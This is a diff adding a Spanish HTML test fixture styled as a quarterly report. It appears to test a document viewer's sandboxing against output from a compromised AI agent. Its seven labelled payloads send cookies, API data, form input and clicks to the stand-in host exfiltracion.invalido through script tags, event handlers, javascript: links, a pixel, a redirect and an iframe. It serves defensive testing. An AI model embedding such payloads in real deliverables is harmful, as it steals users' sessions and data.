@@ -1,0 +1,60 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<title>Informe trimestral</title>
+<!--
+  LABORATORIO DEL CRITERIO 3 de DU-19 (R-11, gate D10).
+
+  Este es el HTML que un agente comprometido podría generar: **parece un
+  entregable** y hace, a propósito, las cinco cosas que el visor tiene que
+  impedir. Cada una está marcada con lo que intenta.
+
+  Si el visor lo sirviera tal cual desde el dominio de la aplicación, las cinco
+  funcionarían. Que aquí no funcione ninguna es lo que prueban las tres capas:
+  origen separado, CSP `default-src 'none'` + sandbox, y el saneado del
+  servidor.
+
+  No se importa desde ninguna parte y no se compila con la aplicación.
+-->
+<meta http-equiv="refresh" content="0;url=https://exfiltracion.invalido/">
+<link rel="stylesheet" href="https://exfiltracion.invalido/estilo.css">
+<style>body{font-family:system-ui;padding:2rem}</style>
+</head>
+<body>
+<h1>Informe trimestral</h1>
+<p>Resumen de actividad del trimestre.</p>
+
+<!-- 1 · Robar la cookie de sesión -->
+<script>
+  fetch("https://exfiltracion.invalido/robo?c=" + encodeURIComponent(document.cookie));
+  window.top.location = "https://exfiltracion.invalido/";
+</script>
+
+<!-- 2 · Llamar a la API de la aplicación con las credenciales del navegador -->
+<script>
+  fetch("/api/v1/captures", { credentials: "include" })
+    .then((r) => r.text())
+    .then((t) => fetch("https://exfiltracion.invalido/datos", { method: "POST", body: t }));
+</script>
+
+<!-- 3 · Cargar recursos externos (una imagen basta para filtrar por la URL) -->
+<img src="https://exfiltracion.invalido/pixel.gif?quien=cliente" alt="" width="1" height="1">
+
+<!-- 4 · Ejecutar sin etiqueta script, por atributo de evento -->
+<div onmouseover="fetch('https://exfiltracion.invalido/hover')" onload="fetch('https://exfiltracion.invalido/load')">
+  Pasa el ratón por aquí
+</div>
+
+<!-- 5 · Un enlace que ejecuta -->
+<p><a href="javascript:fetch('https://exfiltracion.invalido/clic')">Descargar el anexo</a></p>
+
+<!-- 6 · Un formulario que manda a otro sitio lo que el cliente escriba -->
+<form action="https://exfiltracion.invalido/formulario" method="post">
+  <input name="dato"><button type="submit">Enviar</button>
+</form>
+
+<!-- 7 · Un iframe anidado que vuelve a intentar todo lo anterior -->
+<iframe src="https://exfiltracion.invalido/anidado"></iframe>
+</body>
+</html>
